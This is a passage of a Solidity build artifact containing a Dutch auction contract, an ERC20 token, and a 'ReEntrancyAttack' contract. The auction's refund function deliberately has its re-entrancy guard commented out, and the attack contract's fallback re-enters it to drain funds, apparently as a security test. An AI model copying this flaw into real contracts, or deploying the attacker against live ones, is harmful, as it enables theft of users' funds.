Dutch_Auction__Open();\\n        _; //do the rest of the function\\n    }\\n\\n    /***\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     * -------------------------------------------------------------------------------------\\n     */\\n\\n    /** Events\\n     *\\n     */\\n    event startAuctionEvent(\\n        uint256 startTime,\\n        address ERC20Address,\\n        uint256 totalAlgosAvailable,\\n        uint256 changePerMin\\n    );\\n    event addBidderEvent(\\n        uint256 bidderID,\\n        address walletAddress,\\n        uint256 bidvalue\\n    );\\n    event updateCurrentPriceEvent(uint256 timeElapsed, uint256 currentprice);\\n    event sendTokenEvent(address bidderAddress, uint256 tokensSent);\\n    event calculateEvent(\\n        address bidderAddress,\\n        uint256 TokensPurchased,\\n        uint256 refundValue\\n    );\\n\\n    event RefundEvent(\\n        address bidderAddress,\\n        uint256 TokensPurchased,\\n        uint256 refundValue\\n    );\\n\\n    event endAuctionEvent(\\n        uint256 totalBidders,\\n        uint256 burntERC20,\\n        uint totalETHEarned\\n    );\\n\\n    function startAuction(\\n        uint256 _totalAlgosAvailable,\\n        uint256 _changePerMin\\n    ) public onlyOwner AuctionClosed returns (address) {\\n        s_auctionState = AuctionState.OPEN;\\n        totalAlgosAvailable = _totalAlgosAvailable;\\n        changePerMin = _changePerMin;\\n        currentPrice = int256(startPrice);\\n        currentUnsoldAlgos = _totalAlgosAvailable;\\n        startTime = block.timestamp; //Start time of when the contract is deployed\\n        DAToken = new ERC20Token(totalAlgosAvailable, address(this));\\n        ERC20ContractAddress = address(DAToken);\\n        emit startAuctionEvent(\\n            startTime,\\n            ERC20ContractAddress,\\n            totalAlgosAvailable,\\n            changePerMin\\n        );\\n        return ERC20ContractAddress;\\n    }\\n\\n    /**\\n     * public functions\\n     *\\n     * */\\n\\n    function addBidder() public payable notOwner AuctionOpen {\\n        //checking all the requirements\\n        require(msg.value > 0, \\\"bidValue less than 0\\\");\\n        calculate();\\n        require(block.timestamp - startTime < AUCTION_TIME, \\\"time is up\\\");\\n        require(currentUnsoldAlgos > 0, \\\"There is no more algos left\\\");\\n\\n        // Adding or Updating the bidders currently in the contract\\n        Bidder storage newBidder = biddersList[totalNumBidders];\\n        newBidder.bidderID = totalNumBidders;\\n        newBidder.walletAddress = msg.sender;\\n        newBidder.bidValue = msg.value;\\n        newBidder.isExist = true;\\n        newBidder.totalAlgosPurchased = 0;\\n        newBidder.refundEth = 0;\\n        biddersList[totalNumBidders] = newBidder;\\n        emit addBidderEvent(\\n            newBidder.bidderID,\\n            newBidder.walletAddress,\\n            newBidder.bidValue\\n        );\\n        totalNumBidders++;\\n        calculate(); //calculate again in case the tokens are run out \\n    }\\n\\n    function updateCurrentPrice() public {\\n        if (!prematureEnd){\\n        currentPrice =\\n            int256(startPrice) -\\n            int256((block.timestamp - startTime) / 60) *\\n            int256(changePerMin);\\n\\n        if (currentPrice <= 0 || currentPrice <= int256(reservePrice)) {\\n            currentPrice = int256(reservePrice);\\n        }\\n        emit updateCurrentPriceEvent(\\n            (block.timestamp - startTime),\\n            uint256(currentPrice)\\n        );\\n        }\\n    }\\n\\n    function sendTokens() public {\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            if (biddersList[i].totalAlgosPurchased > 0) {\\n                DAToken.approve(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\\n                );\\n                DAToken.transferFrom(\\n                    address(this),\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\\n                );\\n                emit sendTokenEvent(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased\\n                );\\n            }\\n        }\\n    }\\n\\n    function refundETH() public{\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            if (\\n                biddersList[i].refundEth > 0 &&\\n                address(this).balance > biddersList[i].refundEth && address(this).balance > 0\\n            ) {\\n                //refundETH\\n                uint256 sendValue = biddersList[i].refundEth;\\n                //biddersList[i].refundEth = 0; // re-entrancy attack prevention\\n                (bool callSuccess, ) = payable(biddersList[i].walletAddress)\\n                    .call{value: sendValue}(\\\"\\\");\\n               // require(callSuccess, \\\"Failed to send ether\\\");\\n                emit RefundEvent(\\n                    biddersList[i].walletAddress,\\n                    biddersList[i].totalAlgosPurchased,\\n                    sendValue\\n                );\\n            }\\n        }\\n    }\\n\\n    function calculate() public {\\n        updateCurrentPrice();\\n        uint256 currentAlgos = totalAlgosAvailable;\\n        for (uint i = 0; i < totalNumBidders; i++) {\\n            //if there is sufficient algos for this current bidder\\n            if (\\n                currentAlgos >= biddersList[i].bidValue / uint256(currentPrice)\\n            ) {\\n                biddersList[i].totalAlgosPurchased =\\n                    biddersList[i].bidValue /\\n                    uint256(currentPrice);\\n                currentAlgos -= biddersList[i].bidValue / uint256(currentPrice);\\n                biddersList[i].refundEth = 0;\\n            }\\n            //Else if there is algos left but it is less than the amount the bidder bidded\\n            // he gets all the remaining algos and is refunded the ETH.\\n            else if (\\n                currentAlgos > 0 &&\\n                currentAlgos < biddersList[i].bidValue / uint256(currentPrice)\\n            ) {\\n                biddersList[i].totalAlgosPurchased = currentAlgos;\\n                currentAlgos = 0;\\n                biddersList[i].refundEth =\\n                    biddersList[i].bidValue -\\n                    biddersList[i].totalAlgosPurchased *\\n                    uint256(currentPrice);\\n            }\\n            //there is no algos left\\n            // reset the total algos purchased to 0\\n            else if (currentAlgos <= 0) {\\n                //refund for the rest\\n                biddersList[i].totalAlgosPurchased = 0;\\n                biddersList[i].refundEth = biddersList[i].bidValue;\\n            }\\n            emit RefundEvent(\\n                biddersList[i].walletAddress,\\n                biddersList[i].totalAlgosPurchased,\\n                biddersList[i].refundEth\\n            );\\n        }\\n\\n        if (currentAlgos > 0) {\\n            currentUnsoldAlgos = currentAlgos;\\n        } else {\\n            s_auctionState = AuctionState.CLOSING;\\n            currentUnsoldAlgos = 0;\\n            prematureEnd = true;\\n        }\\n    }\\n\\n    function endAuction() public {\\n        s_auctionState = AuctionState.CLOSING;\\n        calculate();\\n        refundETH();\\n        sendTokens();\\n        if (currentUnsoldAlgos > 0) {\\n            DAToken.burn(address(this), currentUnsoldAlgos);\\n        }\\n        emit endAuctionEvent(\\n            totalNumBidders,\\n            currentUnsoldAlgos,\\n            address(this).balance\\n        );\\n    }\\n\\n    /**View and Pure Function */\\n\\n    function retrieveTotalAlgos() public view onlyOwner returns (uint256) {\\n        return totalAlgosAvailable;\\n    }\\n\\n    function retrieveReservePrice() public view onlyOwner returns (uint256) {\\n        return reservePrice;\\n    }\\n\\n    function retrieveCurrentPrice() public view returns (int256) {\\n        return currentPrice;\\n    }\\n\\n    function retrieveTotalBidder() public view onlyOwner returns (uint256) {\\n        return totalNumBidders;\\n    }\\n\\n    function retrieveContractOwner() public view returns (address) {\\n        return i_owner;\\n    }\\n\\n    function retrieveContractBalance() public view onlyOwner returns (uint256) {\\n        return address(this).balance;\\n    }\\n\\n    function retrieveBidderBidValue(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].bidValue;\\n    }\\n\\n    function retrieveBidderAlgos(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].totalAlgosPurchased;\\n    }\\n\\n    function retrieveRefund(\\n        uint256 bidder\\n    ) public view onlyOwner returns (uint256) {\\n        return biddersList[bidder].refundEth;\\n    }\\n\\n    function balanceOfBidder(uint256 bidder) public view returns (uint256) {\\n        return DAToken.balanceOf(biddersList[bidder].walletAddress);\\n    }\\n\\n    fallback() external payable {\\n        // addBidder();\\n    }\\n\\n    receive() external payable {\\n        // addBidder();\\n    }\\n\\n    function getAuctionState() public view returns (AuctionState) {\\n        return s_auctionState;\\n    }\\n}\\n\",\"keccak256\":\"0xc13aa2f8e0221d9315180c501f4ee58c3674a18bfcc96859d4bc435e302abbe0\",\"license\":\"MIT\"},\"contracts/ERC20Token.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.21;\\n\\nimport \\\"@openzeppelin/contracts/token/ERC20/ERC20.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\n\\ncontract ERC20Token is Context, ERC20, Ownable {\\n    constructor(\\n        uint256 initialSupply,\\n        address contractAddress\\n    ) Ownable(msg.sender) ERC20(\\\"ERC20Token\\\", \\\"ET\\\") {\\n        _mint(msg.sender, initialSupply * (10 ** 18));\\n        approve(contractAddress, initialSupply * (10 ** 18));\\n    }\\n\\n    function burn(address i_owner, uint256 amount) public onlyOwner {\\n        _burn(i_owner, amount * 10 ** 18);\\n    }\\n}\\n\",\"keccak256\":\"0xcfe9dcc28ba35f1fc2628f8132fa82b4228fdcb2a9bc3ff1a5af887bc40a79c2\",\"license\":\"MIT\"},\"contracts/ReEntrancyAttack.sol\":{\"content\":\"// SPDX-License-Identifier: MITRe Entry Attack\\n\\npragma solidity ^0.8.21;\\n\\nimport \\\"./Dutch_Auction.sol\\\";\\n\\ncontract ReEntrancyAttack {\\n    Dutch_Auction target;\\n    address targetA;\\n\\n    constructor(address payable _target) payable{\\n        target = Dutch_Auction(_target);\\n        targetA = _target;\\n    }\\n\\n    fallback() external payable {\\n        while(address(targetA).balance>1000){\\n        target.refundETH();}\\n    }\\n\\n    function ReentranceAttack1() public{\\n        target.addBidder{value: 0.000000000000003 ether}();\\n    }\\n\\n    function reEnter() public {\\n        target.refundETH();\\n    }\\n\\n//deliberatily end auction to test\\n\\n}\",\"keccak256\":\"0x067898180db490d0b3ae9f09296ffdb1b83bb46e095873a092c7b1599b7166d6\",\"license\":\"MITRe Entry Attack\"}},\"version\":1}","storageLayout":{"storage":[{"astId":2024,"contract":"contracts/ReEntrancyAttack.sol:ReEntrancyAttack","label":"target","offset":0,"slot":"0","type":"t_contract(Dutch_Auction)1950"},{"astId":2026,"contract":"contracts/ReEntrancyAttack.sol:ReEntrancyAttack","label":"targetA","offset":0,"slot":"1","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_contract(Dutch_Auction)1950":{"encoding":"inplace","label":"contract Dutch_Auction","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}}}}}}